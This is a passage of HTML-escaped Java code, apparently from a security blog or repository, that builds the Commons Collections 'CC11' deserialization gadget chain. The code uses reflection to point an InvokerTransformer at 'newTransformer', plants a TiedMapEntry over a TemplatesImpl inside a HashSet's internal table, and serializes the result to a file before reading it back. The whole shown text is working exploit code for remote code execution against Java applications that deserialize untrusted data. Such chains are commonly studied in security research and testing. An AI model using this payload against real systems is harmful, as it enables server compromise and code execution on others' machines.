ssible(true);        f0.set(templates,null);        InvokerTransformer transformer = new InvokerTransformer(&quot;asdfasdfasdf&quot;, new Class[0], new Object[0]);        HashMap innermap = new HashMap();        LazyMap map = (LazyMap)LazyMap.decorate(innermap,transformer);        TiedMapEntry tiedmap = new TiedMapEntry(map,templates);        HashSet hashset = new HashSet(1);        hashset.add(&quot;foo&quot;);        Field f = null;        try &#123;            f = HashSet.class.getDeclaredField(&quot;map&quot;);        &#125; catch (NoSuchFieldException e) &#123;            f = HashSet.class.getDeclaredField(&quot;backingMap&quot;);        &#125;        f.setAccessible(true);        HashMap hashset_map = (HashMap) f.get(hashset);        Field f2 = null;        try &#123;            f2 = HashMap.class.getDeclaredField(&quot;table&quot;);        &#125; catch (NoSuchFieldException e) &#123;            f2 = HashMap.class.getDeclaredField(&quot;elementData&quot;);        &#125;        f2.setAccessible(true);        Object[] array = (Object[])f2.get(hashset_map);        Object node = array[0];        if(node == null)&#123;            node = array[1];        &#125;        Field keyField = null;        try&#123;            keyField = node.getClass().getDeclaredField(&quot;key&quot;);        &#125;catch(Exception e)&#123;            keyField = Class.forName(&quot;java.util.MapEntry&quot;).getDeclaredField(&quot;key&quot;);        &#125;        keyField.setAccessible(true);        keyField.set(node,tiedmap);        Field f3 = transformer.getClass().getDeclaredField(&quot;iMethodName&quot;);        f3.setAccessible(true);        f3.set(transformer,&quot;newTransformer&quot;);        try&#123;            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc11&quot;));            outputStream.writeObject(hashset);            outputStream.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc1